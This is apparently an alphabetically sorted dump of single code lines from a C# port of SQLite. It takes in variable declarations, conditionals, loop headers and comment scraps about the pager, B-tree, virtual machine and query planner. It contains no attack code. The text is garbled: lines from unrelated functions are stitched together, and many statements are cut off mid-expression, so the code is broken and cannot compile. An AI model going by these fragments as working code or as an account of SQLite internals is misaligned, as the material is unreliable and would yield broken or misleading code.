      TriggerStep pTriggerStep = new TriggerStep()
      TriggerStep pTriggerStep = pStepList
      UNUSED_PARAMETER( NotUsed )
      UNUSED_PARAMETER( argc )
      UNUSED_PARAMETER( iAlias )
      UNUSED_PARAMETER( iOfst )
      UNUSED_PARAMETER( id )
      UNUSED_PARAMETER( isDirectMode )
      UNUSED_PARAMETER( n )
      UNUSED_PARAMETER( nFull )
      UNUSED_PARAMETER( p )
      UNUSED_PARAMETER( pParse )
      UNUSED_PARAMETER( pVfs )
      UNUSED_PARAMETER( size )
      UNUSED_PARAMETER( syncDir )
      UNUSED_PARAMETER(yymajor)
      UNUSED_PARAMETER(yypMinor)
      UnpackedRecord aSpace = new UnpackedRecord()
      UnpackedRecord p
      UnpackedRecord pIdxKey
      VTable 
      VTable pVTab = null
      Vdbe p
      Vdbe p = (Vdbe)pStmt
      Vdbe p = pStmt
      Vdbe pFrom = (Vdbe)pFromStmt
      Vdbe pTo = (Vdbe)pToStmt
      Vdbe pVdbe = (Vdbe)pStmt
      Vdbe pVm
      Vdbe pVm = pStmt
      Vdbe tmp = new Vdbe()
      Vdbe v
      Vdbe v = null
      Vdbe v = pParse.pVdbe
      Vdbe v = pParse.pVdbe = sqlite3VdbeCreate( db )
      Vdbe v = sqlite3GetVdbe( p )
      Vdbe v = sqlite3GetVdbe( pParse )
      VdbeCursor pCx = null
      VdbeFunc pVdbeFunc
      VdbeOp dummy = null
      VdbeOp pOp
      Walker w = new Walker()
      WhereClause pOrWc
      WhereClause pWC
      WhereClause pWC = new WhereClause()
      WhereInfo pWInfo
      WhereLevel pLevel
      WhereMaskSet pMaskSet
      WhereMaskSet pMaskSet = pWC.pMaskSet
      WhereOrInfo pOrInfo
      WhereTerm a
      WhereTerm pOrTerm
      WhereTerm pTerm
      WhereTerm pTerm = pWC.a[idxTerm]
      WhereTerm pWCEnd = pWC.a[pWC.nTerm]
      Word-0               Word-1          Value
      X1 = (int)( 36525 
      X2 = (int)( 306001 
      Y:   The name of a table in a FROM clause.  Or in a trigger
      YYCODETYPE yymajor
      YYMINORTYPE yygotominor
      YYMINORTYPE yyminorunion = new YYMINORTYPE()
      YYYY-MM-DD HH:MM:SS.FFF  
      Z:   The name of a column in table Y.
      [In] ref System.Threading.NativeOverlapped lpOverlapped )
      _ht pEntry
      _ht[] new_ht
      _p4.z = z
      _storeTypeInfo( A )
      a 
      a = a << 14
      a = a << 15
      a = new PgHdr[N_SORT_BUCKET]
      a = pSelect.pEList.a
      a = p[offset 
      a BETWEEN b AND c
      a new page into the cache to populate with the data read
      aCol = paCol = new Column[nCol]
      aData = pPager.pTmpSpace
      aNew = db.aDb[db.nDb]
      aNew.safety_level = 3
      aNew.zName = zName
      aPayload = new byte[pCur.info.nSize - pCur.info.nHeader]
      aPayload = pCur.info.pCell
      aPermute = new int[nOrderBy]
      aWc[0] = ( (compareInfo)pDef.pUserData ).matchAll
      aWc[1] = ( (compareInfo)pDef.pUserData ).matchOne
      aWc[2] = ( (compareInfo)pDef.pUserData ).matchSet
      aXRef = new int[pTab.nCol]
      a[0] = 1000000
      a[0] = sqlite3PcacheRefCount( pPager.pPCache )
      a[10] = pPager.nWrite
      a[1] = sqlite3PcachePagecount( pPager.pPCache )
      a[2] = sqlite3PcacheGetCachesize( pPager.pPCache )
      a[3] = pPager.dbSizeValid 
      a[4] = pPager.state
      a[5] = pPager.errCode
      a[6] = pPager.nHit
      a[7] = pPager.nMiss
      a[8] = 0
      a[9] = pPager.nRead
      acc.db = db
      acc.useMalloc = 0
      addr = 1 
      addr = cellOffset 
      addr = hdr 
      addr = p.nOp
      addr = sqlite3VdbeCurrentAddr( v )
      addrAgtB = sqlite3VdbeCurrentAddr( v )
      addrBrk = pLevel.addrBrk = pLevel.addrNxt = sqlite3VdbeMakeLabel( v )
      addrCont = pLevel.addrCont = sqlite3VdbeMakeLabel( v )
      addrSelectA = sqlite3VdbeCurrentAddr( v )
      addrSelectB = sqlite3VdbeCurrentAddr( v )
      aff = sqlite3ExprAffinity( pExpr.pLeft )
      allocateTempSpace(pBt)
      analysisInfo pInfo = (analysisInfo)pData
      analysisInfo sInfo
      andFlags = 
      ap = null
      apAll[0] = pA
      apAll[1] = pB
      apAll[2] = pC
      apCell = new byte[nMaxCells][]
      apNew = new PgHdr1[nNew]
      applyNumericAffinity( pMem )
      assert( pTab->pVTable==p 
      assert( pTab==pOld )
      assertParentIndex(
      assertTruncateConstraint( pPager )
      associated with the database handle itself must be held.
      associated with the database the virtual table is stored in is held
      azArg[0] = zMasterName
      azArg[2] = zMasterSchema
      b 
      b = b << 14
      b = b << 8
      b = b >> 3
      b = new sqlite3_backup()
      b = p[offset 
      b.iNext = 1
      b.pDest = pTo
      b.pSrc = pFrom
      b.pSrcDb = pFrom.db
      bRev = ( pLevel.plan.wsFlags 
      be necessary to write the current content out to the sub-journal
      been set. We don't need to worry about old siblings that were
      been specified.
      blocked connections list have pUnlockConnection or pBlockingConnection
      bool DIRECT_MODE = false
      bool appendFlag = false
      bool chngRowid
      bool commit_internal = !( ( db.flags 
      bool destHasUniqueIdx = false
      bool doesStatementRollback = false
      bool dwRet = false
      bool fullNames
      bool go = true
      bool gotPendingLock = false
      bool hasDistinct
      bool hasStatementBegin = false
      bool hasTwoRowids = ( isUpdate 
      bool isAgg
      bool isComplete = false
      bool isCompound
      bool isDistinct
      bool isErrorReset = false
      bool isMemDb
      bool isView
      bool isView = false
      bool mustBeUnique = ( prNotFound != 0 )
      bool needXcommit = false
      bool noCase = false
      bool noCase = pInfo.noCase
      bool noReadlock = ( flags 
      bool openAll = false
      bool prevEscape = false
      bool rc
      bool readOnly = false
      bool result = negFlag 
      bool seenReplace = false
      bool useJournal = ( flags 
      bool useTempTable = false
      bool yyendofinput
      btreeClearHasContent(pBt)
      btreeEndTransaction(p)
      btreeIntegrity(p)
      btreeInvokeBusyHandler(pBt) != 0)
      buf[0] 
      bufpt = 0
      byte c = 0
      byte enableLookaside
      byte prefix
      byte xtype = 0
      byte[] A = new byte[4]
      byte[] aCode = {
      byte[] aHash = {
      byte[] aKey = pKey
      byte[] aKey1 = new byte[pKey1.Length - offset]
      byte[] aLen = {
      byte[] aMagic = new byte[8]
      byte[] aNext = {
      byte[] aPayload
      byte[] ac = new byte[4]
      byte[] data
      byte[] data = pPage.aData
      byte[] hit = null
      byte[] newCell = null
      byte[] p
      byte[] p = new byte[4]
      byte[] p = null
      byte[] p = sqlite3Malloc( n )
      byte[] pBlob
      byte[] pCell
      byte[] pCell = new byte[13]
      byte[] pData = pPg.pData
      byte[] pNew = null
      byte[] pP1
      byte[] pPayload
      byte[] pPrior
      byte[] pTemp = new byte[pCell.Length]
      byte[] pV = null
      byte[] temp
      byte[] val
      byte[] zBLOB = null
      byte[] zBlob = null
      byte[] zBytes = null
      byte[] zData
      byte[] zDbHeader = new byte[100]
      byte[] zHeader = pPager.pTmpSpace
      byte[] zMaster = null
      byte[] zOut = zBuf
      byte[] zWrite = zBuf
      byte[][] azChar = null
      c = zDate.Length == 0 
      caseSensitive != 0 
      catch ( Exception e )
      catch ( Exception e )      //            if( rc==INVALID_SET_FILE_POINTER 
      catch ( IOException e )
      catch { }
      cbrk = usableSize
      cellOffset = pPage.cellOffset
      cellbody = nUsable
      cells stored on the sibling pages may need to be updated.
      char aff
      char aff = comparisonAffinity( pExpr )
      char aff1 = sqlite3ExprAffinity( pExpr )
      char c
      char prefix
      char quote
      char[] buf = new char[etBUFSIZE]
      char[] p
      char[] wc = new char[3]
      checkActiveVdbeCnt( db )
      chngRowid = false
      chngToIN = 
      closeAllCursors( p )
      cnt
      cntNew[k] = nCell
      columnMallocFailure( pStmt )
      combined_flags = f1 
      compareInfo pInfo
      computeHMS( p )
      computeJD( p )
      computeJD( x )
      computeJD( y )
      computeYMD( p )
      computeYMD_HMS( x )
      const char 
      const i64 maxInt = LARGEST_INT64
      const i64 minInt = SMALLEST_INT64
      const int LOCKFILE_FAIL_IMMEDIATELY = 1
      const int nByte = 32
      const int nMsg = 300
      const sqlite3_int64 ntuPerDay =
      const sqlite3_int64 ntuPerHalfDay =
      createVarMap( p )
      d = (int)szHdr
      d = digit
      d1 = (int)szHdr1
      data = pP1.aData
      data = pPage.aData
      data[18] = 1
      data[19] = 1
      data[20] = (u8)(pBt.pageSize - pBt.usableSize)
      data[21] = 64
      data[22] = 32
      data[23] = 32
      data[hdr 
      data[hdr] = (u8)flags
      data[pPage.hdrOffset 
      db = new sqlite3()
      db = p.db
      db = p.dbMem
      db = pParse.db
      db = pTable.dbMem
      db = sqlite3VdbeDb( p )
      db->mallocFailed = 1
      db->pVTab = 0
      db.aDb[0].safety_level = 3
      db.aDb[1].safety_level = 1
      db.aDb[db.nDb] = new Db()
      db.aLimit[SQLITE_LIMIT_LENGTH] )
      db.autoCommit = 1
      db.busyHandler.nBusy = 0
      db.busyHandler.pArg = pArg
      db.busyHandler.xFunc = xBusy
      db.errCode = rc
      db.errMask = (int)( onoff 
      db.errMask = 0xff
      db.flags 
      db.flags = savedFlags
      db.flags = saved_flags
      db.init.busy = 0
      db.init.busy = 1
      db.isTransactionSavepoint = 0
      db.lookaside.bEnabled = enableLookaside
      db.magic = SQLITE_MAGIC_BUSY
      db.magic = SQLITE_MAGIC_CLOSED
      db.magic = SQLITE_MAGIC_ERROR
      db.magic = SQLITE_MAGIC_OPEN
      db.nChange = nChange
      db.nChange = saved_nChange
      db.nDb
      db.nDb = 2
      db.nDb = j
      db.nSavepoint = 0
      db.nStatement = 0
      db.nTotalChange 
      db.nTotalChange = saved_nTotalChange
      db.nextAutovac = -1
      db.nextPagesize = 0
      db.openFlags 
      db.openFlags = flags
      db.pCollNeededArg = pCollNeededArg
      db.pCommitArg = pArg
      db.pDfltColl.type = SQLITE_COLL_BINARY
      db.pProfileArg = pArg
      db.pRollbackArg = pArg
      db.pTraceArg = pArg
      db.pUpdateArg = pArg
      db.pVdbe = p
      db.pVfs = sqlite3_vfs_find( zVfs )
      db.temp_store = (u8)ts
      db.u1.isInterrupted = true
      db.xCollNeeded = xCollNeeded
      db.xCollNeeded16 = null
      db.xCommitCallback = xCallback
      db.xProfile = xProfile
      db.xRollbackCallback = xCallback
      db.xTrace = xTrace
      db.xUpdateCallback = xCallback
      db2->pDisconnect = pVTable
      depth = 0
      dest = new SelectDest()
      dest = pDest
      digit = (int)val
      disable_simulated_io_errors()
      discarded if they are found to be invalid.
      do
      double cost
      double logN = 1
      double ms = 0.0
      double nRow
      double r
      double r = 0
      double rounder
      double v1 = 0.0
      double x = 10
      double y = x
      double z = y
      dwShareMode = FileShare.Read 
      dxAuth xAuth
      dxDeviceCharacteristics xDeviceCharacteristics )
      dxGetLastError xGetLastError )
      dxInit xInit
      dxMutexNotheld xMutexNotheld
      dxSectorSize xSectorSize = id.pMethods.xSectorSize
      eCreate = createFlag 
      eType == PTRMAP_BTREE 
      elem = pH.first
      else
      else //if ( 0 == db.init.busy )
      else //if (pnChange != 0)
      else _p4.z = z
      else if ( ( eType = sqlite3_value_type( argv[0] ) ) == SQLITE_FLOAT
      else if ( ( f 
      else if ( ( flags 
      else if ( ( jointype 
      else if ( ( p.flags 
      else if ( ( pLevel.plan.wsFlags 
      else if ( ( pMem.flags 
      else if ( ( v 
      else if ( ( zCharSet = sqlite3_value_text( argv[1] ) ) == null )
      else if ( 0 == isMainJrnl 
      else if ( 0 == p.file_format )
      else if ( ALWAYS( pTab != null ) )
      else if ( NEVER( pName2 == null ) 
      else if ( _p4 == null )
      else if ( aff == '
      else if ( aff1 == '
      else if ( affinity != SQLITE_AFF_NONE )
      else if ( argv[0] == null 
      else if ( argv[2] != null 
      else if ( autoInc != 0 )
      else if ( c == '
      else if ( c == 'Z' 
      else if ( db.magic == SQLITE_MAGIC_BUSY )
      else if ( db.u1.isInterrupted )
      else if ( eDest != SRT_Exists )
      else if ( isOpen( pPager.jfd ) 
      else if ( memDb != 0 )
      else if ( n < 0 )
      else if ( n == P4_COLLSEQ )
      else if ( n == P4_DYNAMIC 
      else if ( n == P4_FUNCDEF )
      else if ( n == P4_INT64 )
      else if ( n == P4_INTARRAY )
      else if ( n == P4_KEYINFO )
      else if ( n == P4_KEYINFO_HANDOFF 
      else if ( n == P4_MEM )
      else if ( n == P4_REAL )
      else if ( n == P4_VTAB )
      else if ( op == TK_BLOB )
      else if ( op == TK_INTERSECT )
      else if ( op == TK_ISNULL )
      else if ( op == TK_UMINUS )
      else if ( p.rc != 0 
      else if ( p1 > 0 )
      else if ( p2 > 0 )
      else if ( pA.op != TK_COLUMN 
      else if ( pA.x.pList != null 
      else if ( pB != null )
      else if ( pCx.pCursor != null )
      else if ( pDest.pIndex == null )
      else if ( pExpr.op == TK_BETWEEN 
      else if ( pExpr.op == TK_OR )
      else if ( pKeyInfo.aSortOrder != null 
      else if ( pName2.n == 0 )
      else if ( pPager.errCode != 0 
      else if ( pPager.state != PAGER_SYNCED 
      else if ( pPager.state == PAGER_SYNCED )
      else if ( pParse.rc == SQLITE_OK )
      else if ( pRight != null 
      else if ( pRight == null )
      else if ( pSelect != null )
      else if ( pToCol != null 
      else if ( pX.op == TK_ISNULL )
      else if ( r > (double)maxInt )
      else if ( rc != SQLITE_OK )
      else if ( rc == SQLITE_OK )
      else if ( savedHasAgg != 0 )
      else if ( sqlite3GlobalConfig.bMemstat )
      else if ( vfsList != null )
      else if ( vfsList == pVfs )
      else if ( xDel == SQLITE_DYNAMIC )
      else if ( zDate.Length > 6 ) zDate = zDate.Substring( 6 ).Trim()
      else if ( zIndex >= zDate.Length )// zDate[zIndex] == '
      else if ( zLeft[a] < 256 
      else if ( zNum[iZnum] == '
      else if ( zWhere != null )
      else if ( z[0] == '
      else if ((flags 
      else if ((rc = sqlite3PagerWrite(pPage.pDbPage)) == 0)
      else if (ALWAYS( p.pCursor != null ))
      else if (flagByte == PTF_ZERODATA)
      else if (gap 
      else if (iCell >= pPage.aData.Length 
      else if (loc < 0 
      else if (nPage > 0)
      else pp.pNext = pPage.pNext
      else return null
      else return zLeft[a] - zRight[b]
      enableLookaside = db.lookaside.bEnabled
      enable_simulated_io_errors()
      enc = SQLITE_UTF8
      enc2 = enc
      end
      end                         /
      endOfLoop = sqlite3VdbeMakeLabel( v )
      entries for the right-child pages of each sibling may need
      etByte done
      etByte flag_alternateform
      etByte flag_altform2
      etByte flag_blanksign
      etByte flag_dp
      etByte flag_exp
      etByte flag_leftjustify
      etByte flag_long
      etByte flag_longlong
      etByte flag_plussign
      etByte flag_rtz
      etByte flag_zeropad
      et_info infop
      expandBlob( pMem )
      exprSetHeight( p )
      f = pMem.flags
      f1 = pMem1.flags
      f2 = pMem2.flags
      fi
      file.
      first = (u16)(hdr 
      flag = 0
      flagByte 
      flags 
      flags = (u16)( enc == 0 
      flags = pMem.flags
      fmt 
      for (
      for ( 
      for ( e = 0 
      for ( h = 0 
      for ( i = ( aHash[h] ) - 1 
      for ( i = 0 
      for ( i = 1 
      for ( i = OMIT_TEMPDB 
      for ( i = db.aCollSeq.first 
      for ( i = db.aDb[iDb].pSchema.idxHash.first 
      for ( i = db.aDb[idx].pSchema.tblHash.first 
      for ( i = iDb 
      for ( i = iFrom = 0 
      for ( i = iStart 
      for ( i = iStartAddr 
      for ( i = j = 0 
      for ( i = j = 2 
      for ( i = nIdx - 1 
      for ( i = pIdx.nColumn 
      for ( i = pOrWc.nTerm - 1 
      for ( i = pSrc.nSrc - 1 
      for ( i = pTabList.nSrc - 1 
      for ( i = pWC.nTerm - 1 
      for ( iDb = 0 
      for ( iDepth = 1 
      for ( iOff = iEnd - (i64)nSrcPgsz 
      for ( ii = 0 
      for ( int _pt = 0 
      for ( int i = 0 
      for ( j = 0 
      for ( j = pWC.nTerm 
      for ( k = 0 
      for ( k = pSchema.tblHash.first 
      for ( k = pWC.nTerm 
      for ( n = 0 
      for ( n = 1 
      for ( nMaster = 0 
      for ( nWrite = 0 
      for ( p = db.pSavepoint 
      for ( p = db.pVdbe 
      for ( p = pBackup 
      for ( p = pCache.pDirty 
      for ( p = pHash.a[h] 
      for ( p = pList 
      for ( p = pParse.pAinc 
      for ( p = pTrigger 
      for ( p = pcache1.pLruHead 
      for ( pChunk = p.pChunk 
      for ( pDestIdx = pDest.pIndex 
      for ( pDirty = pCache.pDirty 
      for ( pElem = pHash.first 
      for ( pElem = sqliteHashFirst( temp2 ) 
      for ( pElem = temp1.first 
      for ( pFKey = pTable.pFKey 
      for ( pIdx = pTab.pIndex 
      for ( pIndex = pTab.pIndex 
      for ( pIndex = pTable.pIndex 
      for ( pParent = p 
      for ( pSub = pSub.pPrior 
      for ( pVfs = vfsList 
      for ( pc = p.pc 
      for ( pp = pCache.apHash[h] 
      for ( u = 0 
      for (i = 0
      for (i = 1
      for (i = k - 1
      for (i = nCell - 1
      for (i = pPage.nOverflow - 1
      for (p = pBt.pCursor
      for (p = pBtree.pBt.pCursor
      for (p = pCur.pBt.pCursor
      for (pCsr = pBt.pCursor
      for (pCur = pBt.pCursor
      for (subtotal = k = i = 0
      for(iCol=0
      foreach row1 in t1 do       
      foreach row2 in t2 do
      freeIndex( ref p )
      from the database or written to the journal file (why should it
      from the savepoint journal.
      fullNames = ( db.flags 
      function.
      gap = pPage.cellOffset 
      getCellInfo(pCur)
      goto delmaster_out
      goto pager_acquire_err
      goto vdbe_error_halt
      h 
      h = ( ( sqlite3UpperToLower[z[iOffset 
      h = ( sqlite3UpperToLower[(u8)zName[0]] 
      h = BITVEC_HASH( i
      h = iNew % pCache.nHash
      h = iOld % pCache.nHash
      h = pPage.iKey % pCache.nHash
      hasDistinct = distinct >= 0
      have also already been taken care of by the insertCell() code.
      hdr = pPage.hdrOffset
      hit = new byte[pBt.pageSize]
      i 
      i = 0
      i = PENDING_BYTE_PAGE(pBt)
      i = atoi( z )
      i = doubleToInt64( r1 )
      i = p.nCol - 1
      i = p.nLabel
      i = p.nOp
      i = pIdx
      i = pParent.nOverflow 
      i = pParse.iRangeReg
      i = yy_reduce_ofst[stateno]
      i--
      i64 _n
      i64 c = pPager.journalOff
      i64 i
      i64 i64Temp = 0
      i64 iEnd = (i64)iSrcPg 
      i64 iHdrOff
      i64 iOff
      i64 iOffset
      i64 iRandom = 0
      i64 longvalue
      i64 n
      i64 nCellKey = 0
      i64 nEntry = 0
      i64 nMasterJournal
      i64 offset = 0
      i64 szJ
      iBest = 0
      iCellDepth = pCur.iPage
      iCellFirst = cellOffset 
      iCellIdx = pCur.aiIdx[iCellDepth]
      iCellLast = usableSize - 4
      iChunkOffset = (int)( iOfst % JOURNAL_CHUNKSIZE )
      iContinue = sqlite3VdbeMakeLabel( v )
      iCur = pTabItem.iCursor
      iCur = pTabList.a[0].iCursor = pParse.nTab
      iDest = pParse.nTab
      iEnd = sqlite3VdbeMakeLabel( v )
      iHdrOff = pPager.journalOff
      iIdxCur = pParse.nTab
      iLast = pPage.pBt.usableSize - 4
      iMem = pParse.nMem 
      iOffset = ( pgno - 1 ) 
      iParent = pSubitem.iCursor
      iPtrMap = (Pgno)((pgno - 2) / nPagesPerMapPage)
      iSrc = pParse.nTab
      iStatCur = pParse.nTab
      iTab = pOrderBy.iECursor
      iValue = sqlite3_pager_readdb_count.iValue
      idx = 
      idx = pCur.aiIdx[pCur.iPage]
      idx1 = (u32)( ( szHdr1 = aKey1[0] ) <= 0x7f 
      idxLru = -1
      if (
      if ( 
      if ( !IN_DECLARE_VTAB )
      if ( !IsVirtual( pTab ) 
      if ( !String.IsNullOrEmpty( zFilename ) )
      if ( !id.fs.CanRead ) return SQLITE_IOERR_READ
      if ( !isAgg 
      if ( !isFatalError( rc ) )
      if ( !isOpen( pPager.fd ) )
      if ( !isOpen( pPager.jfd ) )
      if ( !isView )
      if ( !needQuote )
      if ( !p.isSorted )
      if ( !pCx.ephemPseudoTable )
      if ( !pPager.changeCountDone 
      if ( !pPager.dbModified 
      if ( !pPager.exclusiveMode 
      if ( !pPager.exclusiveMode )
      if ( !pPager.tempFile )
      if ( !sqlite3BtreeIsInReadTrans( pDb.pBt ) )
      if ( !sqlite3SafetyCheckOk( db ) )
      if ( !sqlite3SafetyCheckSickOrOk( db ) )
      if ( !useJournal )
      if ( !wsdPrng.isInit )
      if ( ( ( pPg.flags 
      if ( ( andFlags 
      if ( ( argc == 0 
      if ( ( combined_flags 
      if ( ( db.flags 
      if ( ( f 
      if ( ( fg 
      if ( ( flags 
      if ( ( locktype == RESERVED_LOCK ) 
      if ( ( null == pColl ) 
      if ( ( op == TK_AGG_COLUMN 
      if ( ( p = pParse.pNewTable ) == null ) return
      if ( ( p.btreeMask 
      if ( ( p.flags 
      if ( ( p.nCol 
      if ( ( p.selFlags 
      if ( ( p5 
      if ( ( pA.flags 
      if ( ( pAggInfo.aFunc[0].pFunc.flags 
      if ( ( pColl.type != SQLITE_COLL_BINARY 
      if ( ( pCtx.s.flags 
      if ( ( pDest.iPKey < 0 
      if ( ( pDest.tabFlags 
      if ( ( pEnd == null 
      if ( ( pExpr.flags 
      if ( ( pFrom.flags 
      if ( ( pLeft.flags 
      if ( ( pLevel.plan.wsFlags 
      if ( ( pMem.flags 
      if ( ( pMem1.flags 
      if ( ( pOut.flags 
      if ( ( pPKey2.flags 
      if ( ( pPager.noSync ) 
      if ( ( pPager.state >= PAGER_EXCLUSIVE )
      if ( ( pPg.flags 
      if ( ( pRec.flags 
      if ( ( pSelect.selFlags 
      if ( ( pSrc.jointype 
      if ( ( pSrc.tabFlags 
      if ( ( pSub.selFlags 
      if ( ( pSubitem.jointype 
      if ( ( pTab = pParse.pNewTable ) == null 
      if ( ( pTab.tabFlags 
      if ( ( pTo.flags 
      if ( ( pVal.flags 
      if ( ( sqlite3PcacheRefCount( pPager.pPCache ) == 0 )
      if ( ( sqlite3_current_time.iValue ) != 0 )
      if ( ( sqlite3_io_error_persist.iValue != 0 
      if ( ( tmask 
      if ( ( v 
      if ( ( v = sqlite3GetVdbe( pParse ) ) != null )
      if ( ( vfsFlags 
      if ( ( wctrlFlags 
      if ( /
      if ( 0 == ( a 
      if ( 0 == ( b 
      if ( 0 == ( flags 
      if ( 0 == ( p.flags 
      if ( 0 == createFlag 
      if ( 0 == db.autoCommit )
      if ( 0 == db.init.busy 
      if ( 0 == db.init.busy )
      if ( 0 == initbusy 
      if ( 0 == isView 
      if ( 0 == okOnePass )
      if ( 0 == p.okVar )
      if ( 0 == p.u.aHash[h] )
      if ( 0 == p.validJD )
      if ( 0 == pParse.db.init.busy 
      if ( 0 == r )
      if ( 0 == sqlite3Strlen30( sqlite3BtreeGetFilename( db.aDb[0].pBt ) )
      if ( A.Length < Limit ) return ( A.Length < B.Length ) 
      if ( A.Length < Limit ) return ( A.Length < bB.Length ) 
      if ( ALWAYS( !String.IsNullOrEmpty( z ) ) )
      if ( ALWAYS( idxLru >= 0 ) )
      if ( ALWAYS( nOp > 0 ) )
      if ( ALWAYS( p != null ) )
      if ( ALWAYS( pCur.eState == CURSOR_VALID ) )
      if ( ALWAYS( pDef != null ) )
      if ( ALWAYS( pDef ) 
      if ( ALWAYS( pExpr.op != TK_REGISTER ) )
      if ( ALWAYS( pFunc != null 
      if ( ALWAYS( pName2 != null ) 
      if ( ALWAYS( pParse.nErr == 0 ) 
      if ( ALWAYS( pSrc ) )
      if ( ALWAYS( pSubitem.pTab != null ) )
      if ( ALWAYS( pTab ) )
      if ( ALWAYS( pTrigger != null ) )
      if ( ALWAYS( rc >= 0 ) 
      if ( ALWAYS( sEnd.z[0] != 0 ) 
      if ( ALWAYS( v ) )
      if ( B.Length < Limit ) return 
      if ( IsVirtual( pTab ) 
      if ( IsVirtual( pTab ) )
      if ( IsVirtual( pTab ) ) return
      if ( IsVirtual( pTab ) ) return 0
      if ( IsVirtual( pTab ) ) return null
      if ( IsVirtual( pTable ) ) return 0
      if ( M <= 2 )
      if ( N < 0 )
      if ( N < 0 ) return 0
      if ( N < n 
      if ( N == 0 
      if ( NEVER(
      if ( NEVER( iDb < 0 ) 
      if ( NEVER( iFrom == iTo ) ) return
      if ( NEVER( iNew > pCache.iMaxKey ) )
      if ( NEVER( p == null ) 
      if ( NEVER( p == null ) ) return
      if ( NEVER( p.pSrc == null ) 
      if ( NEVER( pDef == null ) 
      if ( NEVER( pExpr == null ) 
      if ( NEVER( pExpr == null ) ) return
      if ( NEVER( pList == null ) ) return 0
      if ( NEVER( pPager.errCode !=0)
      if ( NEVER( pPager.errCode )!=0 ) return pPager.errCode
      if ( NEVER( pPager.readOnly ) ) return SQLITE_PERM
      if ( NEVER( pPager.state < PAGER_RESERVED ) ) return SQLITE_ERROR
      if ( NEVER( pParse.nErr != 0 ) 
      if ( NEVER( pTab == null ) ) return 0
      if ( NEVER( v == null ) ) return
      if ( NEVER( zTab == null ) ) goto insert_cleanup
      if ( NEVER(!isOpen( pPager.fd ) ))
      if ( OMIT_TEMPDB == 0 
      if ( SQLITE_DEFAULT_FILE_FORMAT < 4 )
      if ( SQLITE_OK != sqlite3ReadSchema( pParse ) )
      if ( SQLITE_OK == pPager.errCode )
      if ( SQLITE_TEMP_STORE < 1 
      if ( SQLITE_TEMP_STORE == 1 )
      if ( SQLITE_TEMP_STORE == 2 )
      if ( SQLITE_TEMP_STORE == 3 )
      if ( SimulateDiskfullError() ) return SQLITE_FULL
      if ( SimulateIOError() ) return SQLITE_IOERR_WRITE
      if ( String.IsNullOrEmpty( val ) ) return null
      if ( String.IsNullOrEmpty( z ) ) return 0
      if ( String.IsNullOrEmpty( zConverted ) )
      if ( String.IsNullOrEmpty( zFilename ) 
      if ( String.IsNullOrEmpty( zUtf8Name ) )
      if ( UpperToLower == null ) UpperToLower = sqlite3UpperToLower
      if ( a == zLeft.Length 
      if ( a.Length < Offset 
      if ( aCol == null ) return SQLITE_NOMEM
      if ( aPermute != null )
      if ( addr < 0 )
      if ( aff1 != '
      if ( affinity == SQLITE_AFF_TEXT )
      if ( allowedOp( op ) 
      if ( ap == null 
      if ( ap.Length == 0 ) return zFormat
      if ( apNew != null )
      if ( appendBias )
      if ( argc == 0 
      if ( argc == 0 )
      if ( argc == 1 )
      if ( argc == 2 )
      if ( argc == 3 )
      if ( argv == null 
      if ( argv == null ) return 0
      if ( argv[1] == null )
      if ( b.Length < Limit ) return 
      if ( bA.Length < Limit ) return ( bA.Length < B.Length ) 
      if ( bA.Length < Limit ) return ( bA.Length < bB.Length ) 
      if ( bB.Length < Limit ) return 
      if ( c != 0 )
      if ( c == '-' )
      if ( c >= 0xc0 )
      if ( c0 == 0 ) return 0
      if ( c1 == 0 ) return c0
      if ( caseSensitive != 0 )
      if ( chngRowid )
      if ( chngToIN != 0 )
      if ( cksum != 0 )
      if ( cnt
      if ( cnt != 1 )
      if ( cnt == 0 
      if ( cnt == 1 )
      if ( count < NDELAY )
      if ( count > 0 )
      if ( createFlag != 0 
      if ( createFlag == 1 
      if ( createFlag == 1 ) sqlite3BeginBenignMalloc()
      if ( createFlag == 1 ) sqlite3EndBenignMalloc()
      if ( createStat1 == 0 )
      if ( data == null ) return null
      if ( db != null 
      if ( db != null )
      if ( db == null )
      if ( db == null ) goto opendb_out
      if ( db == null ) return false
      if ( db.aDb == null ) return
      if ( db.aDb[1].pBt != null )
      if ( db.aDb[1].pBt == null 
      if ( db.activeVdbeCnt == 0 )
      if ( db.autoCommit != 0 )
      if ( db.init.busy != 0 
      if ( db.init.busy != 0 )
      if ( db.init.busy == 0 )
      if ( db.init.iDb == 1 ) isTemp = 1
      if ( db.lookaside.bMalloced )
      if ( db.lookaside.pStart != 0 ) db.lookaside.bEnabled = 1
      if ( db.magic == SQLITE_MAGIC_BUSY )
      if ( db.magic == SQLITE_MAGIC_OPEN )
      if ( db.nDb != j ) db.aDb[j] = new Db()
      if ( db.nDb <= 2 
      if ( db.nDb >= db.aLimit[SQLITE_LIMIT_ATTACHED] 
      if ( db.pErr != null )
      if ( db.pVdbe != null )
      if ( db.pVfs == null )
      if ( db.temp_store == ts ) return SQLITE_OK
      if ( db.u1.isInterrupted ) goto abort_due_to_interrupt
      if ( db.xCollNeeded != null )
      if ( db.xRollbackCallback != null 
      if ( dest.eDest == SRT_EphemTab )
      if ( doMakeRec )
      if ( eDest == SRT_Output 
      if ( eMode >= 0
      if ( eMode >= 0 
      if ( eType == 0 )
      if ( elem != null )
      if ( elem.next != null )
      if ( elem.prev != null )
      if ( emptyDestTest != 0 )
      if ( enc != SQLITE_UTF8 )
      if ( enc == SQLITE_UTF16BE ) zIndex
      if ( enc2 < SQLITE_UTF8 
      if ( enc2 == SQLITE_UTF16 
      if ( flags == SQLITE_ACCESS_EXISTS )
      if ( fs == null 
      if ( got == amt )
      if ( gotPendingLock 
      if ( handle == IntPtr.Zero )
      if ( hasDistinct )
      if ( hasStatementBegin 
      if ( i < 0 )
      if ( i < 1 
      if ( i < 2 )
      if ( i == 1 )
      if ( i > 10 )
      if ( i > p.iSize ) return 0
      if ( i >= db.nDb )
      if ( i >= p.nLabelAlloc )
      if ( i >= p.nOp )
      if ( iArg < 0 ) goto failed
      if ( iBatch != pRowSet.iBatch )
      if ( iCol >= 0 
      if ( iColumn < 0 )
      if ( iDb < 0 ) return
      if ( iDb < db.nDb )
      if ( iDb == 0 
      if ( iDb == 0 )
      if ( iDb == 1 
      if ( iDb >= 0 )
      if ( iDepth == 1 )
      if ( iLimit <= pCache.iMaxKey )
      if ( iLimit > 0 )
      if ( iLimit >= -1 )
      if ( iReg != 0 
      if ( iSavepoint < pPager.nSavepoint )
      if ( inReg != target 
      if ( initData.rc != 0 )
      if ( invalidateTempStorage( pParse ) != SQLITE_OK )
      if ( isAgg 
      if ( isAppropriateForFactoring( pExpr ) != 0 )
      if ( isCompound 
      if ( isDistinct )
      if ( isHot != 0 
